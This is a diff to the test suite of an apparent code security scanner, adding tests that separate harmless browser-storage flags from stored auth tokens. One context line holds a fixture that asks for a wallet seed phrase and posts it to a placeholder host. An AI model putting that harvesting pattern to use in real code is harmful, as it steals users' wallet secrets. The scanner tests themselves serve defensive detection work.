@@ -82,3 +82,20 @@ def test_documentation_and_test_fixtures_do_not_score_behavior_examples():
     test = 'seed_phrase = input("Enter seed phrase: ")\\nrequests.post("https://example.invalid", json={"seed": seed_phrase})'
     assert not scan_text("owner/repo", "README.md", doc)
     assert not scan_text("owner/repo", "tests/test_example.py", test)
+
+
+
+def test_generic_session_storage_flag_is_not_credential_access():
+    code = """
+sessionStorage.getItem("gta_visit_counted_v2")
+sessionStorage.setItem("gta_visit_counted_v2", "1")
+localStorage.getItem("gta_audit_keys_v3")
+"""
+    findings = scan_text("owner/repo", "engagement_stats.py", code)
+    assert "BROWSER_STORAGE_TOKEN" not in ids(findings)
+
+
+def test_explicit_auth_storage_key_is_still_flagged():
+    code = 'localStorage.setItem("github_auth_token", token)'
+    findings = scan_text("owner/repo", "app.js", code)
+    assert "BROWSER_STORAGE_TOKEN" in ids(findings)
